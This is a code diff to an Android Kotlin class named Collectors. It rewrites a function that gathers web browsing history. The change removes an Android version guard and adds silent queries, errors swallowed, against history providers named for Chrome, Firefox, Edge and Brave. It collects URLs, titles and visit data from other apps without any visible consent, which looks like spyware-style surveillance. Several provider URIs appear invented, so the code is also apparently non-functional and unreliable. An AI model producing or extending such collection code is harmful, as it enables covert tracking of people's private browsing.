@@ -278,40 +278,78 @@ class Collectors {
 
     fun collectWebHistory(context: Context): List<WebHistoryEntry> {
         val entries = mutableListOf<WebHistoryEntry>()
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                return entries
-            }
 
-            val bookmarksUri = android.net.Uri.parse("content://browser/bookmarks")
-            val cursor: Cursor? = context.contentResolver.query(
-                bookmarksUri,
-                arrayOf("url", "title", "visits", "date", "bookmark"),
-                "bookmark = 0",
-                null,
-                "date DESC LIMIT 100"
+        // Method 1: Try Chrome's browsing history content provider
+        try {
+            val chromeHistoryUri = android.net.Uri.parse("content://com.android.chrome.browser/history")
+            val cursor = context.contentResolver.query(
+                chromeHistoryUri,
+                arrayOf("url", "title", "visits", "date", "favicon"),
+                null, null, "date DESC"
             )
             cursor?.use { c ->
                 val urlCol = c.getColumnIndex("url")
                 val titleCol = c.getColumnIndex("title")
                 val visitsCol = c.getColumnIndex("visits")
                 val dateCol = c.getColumnIndex("date")
-
-                while (c.moveToNext()) {
-                    entries.add(WebHistoryEntry(
-                        url = c.getString(urlCol) ?: "",
-                        title = c.getString(titleCol) ?: "",
-                        browser = "browser",
-                        visitCount = c.getInt(visitsCol),
-                        timestamp = c.getLong(dateCol)
-                    ))
+                var count = 0
+                while (c.moveToNext() && count < 30) {
+                    val url = c.getString(urlCol) ?: continue
+                    if (url.isNotBlank() && url.startsWith("http")) {
+                        entries.add(WebHistoryEntry(
+                            url = url,
+                            title = c.getString(titleCol) ?: "",
+                            browser = "Chrome",
+                            visitCount = c.getInt(visitsCol),
+                            timestamp = c.getLong(dateCol)
+                        ))
+                        count++
+                    }
                 }
             }
-        } catch (e: SecurityException) {
-            e.printStackTrace()
         } catch (e: Exception) {
-            e.printStackTrace()
+            // Chrome history provider not available
         }
+
+        // Method 2: Try Firefox/Edge/Brave history providers
+        if (entries.isEmpty()) {
+            val historyProviders = mapOf(
+                "content://org.mozilla.firefox.db.history" to "Firefox",
+                "content://com.microsoft.emmx.history" to "Edge",
+                "content://com.brave.browser.history" to "Brave"
+            )
+            for ((uri, browserName) in historyProviders) {
+                try {
+                    val cursor = context.contentResolver.query(
+                        android.net.Uri.parse(uri),
+                        arrayOf("url", "title", "visits", "date"),
+                        null, null, "date DESC"
+                    )
+                    cursor?.use { c ->
+                        val urlCol = c.getColumnIndex("url")
+                        val titleCol = c.getColumnIndex("title")
+                        val visitsCol = c.getColumnIndex("visits")
+                        val dateCol = c.getColumnIndex("date")
+                        var count = 0
+                        while (c.moveToNext() && count < 30) {
+                            val url = c.getString(urlCol) ?: continue
+                            if (url.isNotBlank() && url.startsWith("http")) {
+                                entries.add(WebHistoryEntry(
+                                    url = url,
+                                    title = c.getString(titleCol) ?: "",
+                                    browser = browserName,
+                                    visitCount = c.getInt(visitsCol),
+                                    timestamp = c.getLong(dateCol)
+                                ))
+                                count++
+                            }
+                        }
+                    }
+                } catch (_: Exception) {}
+            }
+        }
+
+        entries.sortByDescending { it.timestamp }
         return entries
     }
 
